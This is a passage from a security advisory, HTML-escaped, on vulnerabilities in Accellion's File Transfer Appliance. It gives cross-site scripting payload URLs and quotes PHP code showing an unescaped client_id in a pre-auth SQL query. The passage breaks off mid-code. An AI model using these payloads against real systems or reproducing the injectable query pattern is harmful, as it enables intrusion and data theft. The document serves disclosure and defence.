&lt;a href=&quot;/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;about-accellion-fta&quot;&gt;About Accellion FTA&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;
Accellion File Transfer Appliance (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTA&lt;/code&gt;) is a secure file transfer service which enables users to share and sync files online with AES 128/256 encryption. The Enterprise version further incorporates SSL VPN services with integration of Single Sign-on mechanisms like AD, LDAP and Kerberos.
&lt;br /&gt;&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;vulnerability-details&quot;&gt;Vulnerability Details&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;
In this research, the following vulnerabilities were discovered on the FTA version FTA_9_12_0 (13-Oct-2015 Release)&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Cross-Site Scripting x 3&lt;/li&gt;
  &lt;li&gt;Pre-Auth SQL Injection leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Known-Secret-Key leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Local Privilege Escalation x 2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The above-mentioned vulnerabilities allow unauthenticated attackers to remotely attack FTA servers and gain highest privileges successfully. After the attackers fully controlled the servers, they will be able to retrieve the encrypted files and user data, etc.&lt;/p&gt;

&lt;p&gt;After reporting to CERT/CC, these vulnerabilities were assigned 4 CVEs (CVE-2016-2350, CVE-2016-2351, CVE-2016-2352, CVE-2016-2353).&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;areas-affected&quot;&gt;Areas Affected&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;
According to a public data reconnaissance, there are currently 1,217 FTA servers online around the world, most of which are located in the US, followed by Canada, Australia, UK, and Singapore.&lt;br /&gt;
Determine from the domain name and SSL Certificate of these servers, FTA is widely used by governmental bodies, educational institutions, enterprises, including several well-known brands.&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;vulnerability-analysis-and-exploitation&quot;&gt;Vulnerability Analysis and Exploitation&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;multiple-cross-site-scripting-cve-2016-2350&quot;&gt;Multiple Cross-Site Scripting (CVE-2016-2350)&lt;/h4&gt;

&lt;h5 id=&quot;1-xss-in-move_partition_framehtml&quot;&gt;1. XSS in move_partition_frame.html&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/move_partition_frame.html&lt;br /&gt;
?f2=â€™-prompt(document.domain);//&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h5 id=&quot;2-xss-in-getimageajaxphp&quot;&gt;2. XSS in getimageajax.php&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/web/getimageajax.php&lt;br /&gt;
?documentname=â€onerror=â€prompt(document.domain)//&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h5 id=&quot;3-xss-in-wminfohtml&quot;&gt;3. XSS in wmInfo.html&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/web/wmInfo.html&lt;br /&gt;
?msg=ssologout&lt;br /&gt;
&amp;amp;loginurl=â€&amp;gt;&amp;lt;svg/onload=â€prompt(document.domain)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;pre-auth-sql-injection-leads-to-rce-cve-2016-2351&quot;&gt;Pre-Auth SQL Injection leads to RCE (CVE-2016-2351)&lt;/h4&gt;

&lt;p&gt;After code reviewing, a pre-authentication SQL Injection vulnerability was found in FTA. This vulnerability grants malicious users access to sensitive data and personal information on the server through SQL Injection, and launch remote code execution (RCE) by further exploiting privilege-escalating vulnerabilities.&lt;br /&gt;
The key to this problem lies in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client_properties( ... )&lt;/code&gt; function called by security_key2.api!&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/home/seos/courier/security_key2.api&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;_decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;_generate_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_app_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_username&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;opendb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$client_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;client_properties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Among these parameters, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$g_app_id&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$g_username&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$client_id&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$password&lt;/code&gt; are controllable by the attackers. And although the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_decrypt( ... )&lt;/code&gt; handles the passwords, it does not involve in the triggering of the vulnerability.&lt;br /&gt;
One thing to pay special attention is that the value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$g_app_id&lt;/code&gt; will be treated as a global variable which represents the current Application ID in use, and will be applied in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;opendb( )&lt;/code&gt; accordingly. The code in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;opendb( )&lt;/code&gt; includes the following lines:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;DB_MASTER&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_app_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mysql_select_db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql_select_db&lt;/code&gt;, the name of the database to be opened is controllable by the user. If wrong value was given, the program will be interrupted. Therefore, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$g_app_id&lt;/code&gt; must be forged correctly.&lt;/p&gt;

&lt;p&gt;The following lines are the most important function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client_properties( $client_id )&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;client_properties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$manager&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$order_by&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;client_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$order_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;a&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$limit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$user_type&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;SELECT t_mail_server.* FROM t_mail_server &apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;SELECT t_mail_server.*, t_profile.c_flag as profile_flag FROM t_mail_server, t_profile &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_type&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mysql_escape_like&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user_type&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;manager&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$manager&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user_status&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;construct_where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;

    &lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mysql_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db_result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;fatal_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;exec:mysql_query(&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;) respond:&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;__FILE__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;221&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;construct_where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;c_server_id  != \&apos;999\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;!(t_mail_server.c_flag &amp;amp; &apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;CLIENT_DELETED&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;)&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;c_server_id = \&apos;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;manager&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;manager&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;manager&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;c_manager = \&apos;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;manager&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;t_mail_server.c_name LIKE \&apos;%&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;%\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;%%&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
